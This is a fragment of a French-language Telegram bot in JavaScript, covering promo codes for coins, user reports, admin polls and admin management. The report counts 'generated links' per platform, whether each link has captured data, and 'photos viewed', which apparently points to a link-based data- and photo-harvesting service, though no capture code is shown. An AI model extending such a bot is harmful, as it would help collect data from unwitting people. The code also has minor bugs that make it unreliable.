// --- SYSTÈME DE PROMOTIONS ---

// Fonction pour créer une promotion
function createPromotion(code, discount, expiryDate) {
    return {
        code,
        discount,
        expiryDate,
        used: []
    };
}

// Stockage des promotions (en production, utilisez une base de données)
const promotions = [
    createPromotion("RETOUR10", 10, new Date(Date.now() + 30 * 24 * 60 * 60 * 1000)),
    createPromotion("WELCOME5", 5, new Date(Date.now() + 7 * 24 * 60 * 60 * 1000))
];

// Gestionnaire de codes promotionnels
bot.onText(/\/promo (.+)/, async (msg, match) => {
    const code = match[1].trim().toUpperCase();
    const chatId = msg.chat.id;
    const user = await getUser(chatId);
    
    const promotion = promotions.find(p => p.code === code && 
        !p.used.includes(chatId) && 
        new Date() < p.expiryDate
    );
    
    if (promotion) {
        // Appliquer la promotion
        user.coins += promotion.discount;
        await user.save();
        
        // Marquer le code comme utilisé
        promotion.used.push(chatId);
        
        bot.sendMessage(chatId, 
            createStyledMessage(
                "🎉 PROMOTION VALIDÉE",
                `Félicitations ! Vous avez reçu ${promotion.discount} jetons gratuits.\n\n` +
                `Votre nouveau solde : ${user.coins} 🪙`,
                "success"
            ),
            { parse_mode: 'Markdown' }
        );
    } else {
        bot.sendMessage(chatId, 
            createStyledMessage(
                "❌ CODE INVALIDE",
                "Ce code promotionnel n'est pas valide, a expiré ou a déjà été utilisé.",
                "error"
            ),
            { parse_mode: 'Markdown' }
        );
    }
});

// --- SYSTÈME DE RAPPORTS ---

// Fonction pour générer un rapport utilisateur
async function generateUserReport(chatId) {
    try {
        const user = await getUser(chatId);
        const links = await mongoose.connection.db.collection('links').find({ chatId }).toArray();
        
        const report = {
            user: {
                chatId: user.chatId,
                coins: user.coins,
                totalGenerated: user.totalGenerated,
                totalPhotosViewed: user.totalPhotosViewed,
                lastActive: user.lastActive
            },
            links: links.map(link => ({
                id: link._id,
                platform: link.platform,
                created: link.created,
                hasData: !!link.data
            }))
        };
        
        return report;
    } catch (error) {
        console.error('Erreur lors de la génération du rapport:', error);
        return null;
    }
}

// Commande pour obtenir un rapport détaillé
bot.onText(/\/report/, async (msg) => {
    const chatId = msg.chat.id;
    const report = await generateUserReport(chatId);
    
    if (!report) {
        return bot.sendMessage(chatId, 
            createStyledMessage(
                "❌ ERREUR",
                "Impossible de générer votre rapport.",
                "error"
            ),
            { parse_mode: 'Markdown' }
        );
    }
    
    const reportKeyboard = createStyledKeyboard([
        { text: "📊 Exporter en JSON", callback_data: "export_json" },
        { text: "📧 Envoyer par email", callback_data: "send_email" },
        { text: "🔙 Retour", callback_data: "back_to_main" }
    ], 1);
    
    bot.sendMessage(chatId, 
        createStyledMessage(
            "📊 VOTRE RAPPORT",
            `<b>Statistiques personnelles :</b>\n\n` +
            `• <b>Solde actuel :</b> ${report.user.coins} 🪙\n` +
            `• <b>Liens générés :</b> ${report.user.totalGenerated}\n` +
            `• <b>Photos vues :</b> ${report.user.totalPhotosViewed}\n` +
            `• <b>Dernière activité :</b> ${new Date(report.user.lastActive).toLocaleString()}\n\n` +
            `<b>Liens récents :</b>\n` +
            report.links.slice(0, 5).map(link => 
                `• ${link.platform} - ${new Date(link.created).toLocaleDateString()} - \${link.hasData ? "✅" : "⏳"}`
            ).join('\n'),
            "info"
        ),
        { parse_mode: 'HTML', ...reportKeyboard }
    );
});

// --- SYSTÈME DE SONDAGES ---

// Fonction pour créer un sondage
function createPoll(question, options) {
    return {
        question,
        options: options.map((option, index) => ({ text: option, votes: 0, voters: [] })),
        active: true,
        created: new Date()
    };
}

// Stockage des sondages (en production, utilisez une base de données)
const polls = [];

// Commande pour créer un sondage (admin uniquement)
bot.onText(/\/poll (.+)/, async (msg, match) => {
    if (!isAdminMode) {
        return bot.sendMessage(msg.chat.id, 
            createStyledMessage(
                "🚫 ACCÈS REFUSÉ",
                "Seuls les administrateurs peuvent créer des sondages.",
                "error"
            ),
            { parse_mode: 'Markdown' }
        );
    }

    const parts = match[1].split(";").map(part => part.trim());
    const question = parts[0];
    const options = parts.slice(1, 11); // Limité à 10 options
    
    if (!question || options.length < 2) {
        return bot.sendMessage(msg.chat.id, 
            createStyledMessage(
                "❌ SYNTAXE INCORRECTE",
                "Utilisation : /poll [question];[option1];[option2];...\n" +
                "Maximum 10 options.",
                "error"
            ),
            { parse_mode: 'Markdown' }
        );
    }

    const poll = createPoll(question, options);
    polls.push(poll);

    const pollKeyboard = createStyledKeyboard(
        poll.options.map((option, index) => ({ 
            text: option.text,
            callback_data: `vote_${polls.length - 1}_${index}`
        }))
    );
    
    bot.sendMessage(msg.chat.id, 
        createStyledMessage(
            "📊 NOUVEAU SONDAGE",
            `<b>Question :</b> ${question}\n\n` +
            `<b>Options :</b>\n${poll.options.map(option => `• ${option.text}`).join('\n')}\n\n` +
            `Cliquez sur une option pour voter.`,
            "info"
        ),
        { parse_mode: 'HTML', ...pollKeyboard }
    );
});

// Gestion des votes
bot.on("callback_query", async (query) => {
    const match = query.data.match(/^vote_(\d+)_(\d+)$/);
    
    if (match) {
        const pollIndex = parseInt(match[1]);
        const optionIndex = parseInt(match[2]);
        
        if (polls[pollIndex] && polls[pollIndex].active) {
            const poll = polls[pollIndex];
            const option = poll.options[optionIndex];
            
            if (!option.voters.includes(query.from.id)) {
                option.voters.push(query.from.id);
                option.votes += 1;
                
                await bot.answerCallbackQuery(query.id, { 
                    text: `✅ Vous avez voté pour : ${option.text}`,
                    show_alert: true
                });
                
                // Mettre à jour le message du sondage
                const pollKeyboard = createStyledKeyboard(
                    poll.options.map((opt, i) => ({
                        text: `${opt.text} (${opt.votes} votes)`,
                        callback_data: `vote_${pollIndex}_${i}`
                    }))
                );
                
                await bot.editMessageText(
                    createStyledMessage(
                        "📊 SONDAGE ACTIF",
                        `<b>Question :</b> ${poll.question}\n\n` +
                        `<b>Options :</b>\n${poll.options.map(opt => `• ${opt.text} (${opt.votes} votes)`).join('\n')}\n\n` +
                        `Votre vote a été enregistré.`,
                        "info"
                    ),
                    {
                        chat_id: query.message.chat.id,
                        message_id: query.message.message_id,
                        parse_mode: 'HTML',
                        ...pollKeyboard
                    }
                );
            } else {
                await bot.answerCallbackQuery(query.id, { 
                    text: "❌ Vous avez déjà voté.",
                    show_alert: true
                });
            }
        }
    }
});

// --- SYSTÈME DE GESTION DES ADMINS ---

// Fonction pour ajouter un admin
async function addAdmin(userId) {
    try {
        await mongoose.connection.db.collection('admins').insertOne({ userId });
        return true;
    } catch (error) {
        console.error('Erreur lors de l\'ajout d\'un admin:', error);
        return false;
    }
}

// Fonction pour vérifier si un utilisateur est admin
async function isAdmin(userId) {
    try {
        const admin = await mongoose.connection.db.collection('admins').findOne({ userId });
        return !!admin;
    } catch (error) {
        console.error('Erreur lors de la vérification admin:', error);
        return false;
    }
}

// Commande pour ajouter un admin (superadmin uniquement)
bot.onText(/\/addadmin (\d+)/, async (msg, match) => {
    if (!isAdminMode || !await isAdmin(msg.chat.id)) {
        return bot.sendMessage(msg.chat.id, 
            createStyledMessage(
                "🚫 ACCÈS REFUSÉ",
                "Seuls les superadmins peuvent ajouter des admins.",
                "error"
            ),
            { parse_mode: 'Markdown' }
        );
    }

    const targetId = match[1];
    if (await addAdmin(targetId)) {
        bot.sendMessage(msg.chat.id, 
            createStyledMessage(
                "✅ ADMIN AJOUTÉ",
                `L'utilisateur \`${targetId}\` est maintenant un admin.`,
                "success"
            ),
            { parse_mode: 'Markdown' }
        );
    } else {
        bot.sendMessage(msg.chat.id, 
            createStyledMessage(
                "❌ ERREUR",
                "Impossible d'ajouter cet utilisateur en tant qu'admin.",
                "error"
            ),
            { parse_mode: 'Markdown' }
        );
    }
});

// --- FONCTIONS UTILITAIRES ---

// Fonction pour formater les nombres
function formatNumber(number) {
    return new Intl.NumberFormat('fr-FR').format(number);
}

// Fonction pour obtenir l'heure actuelle
function getCurrentTime() {
    return new Date().toLocaleString('fr-FR', { 
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit',
        hour12: false
    });
}

// --- DÉMARRAGE DU BOT ---

console.log(`🤖 Bot Telegram dynamique démarré à ${getCurrentTime()} !`);

// Message de bienvenue pour les nouveaux utilisateurs
bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id;
    const user = await getUser(chatId);
    
    // Envoyer un message de bienvenue spécial
    await sendWelcomeMessage(chatId);
});

// --- LOGS ET MAINTENANCE ---

// Logs de maintenance
setInterval(() => {
    console.log(`🔄 Maintenance : ${getCurrentTime()}`);
    cleanupOldData().catch(err => console.error('Erreur nettoyage:', err));
}, 24 * 60 * 60 * 1000);

// --- FIN DU CODE ---
                                              
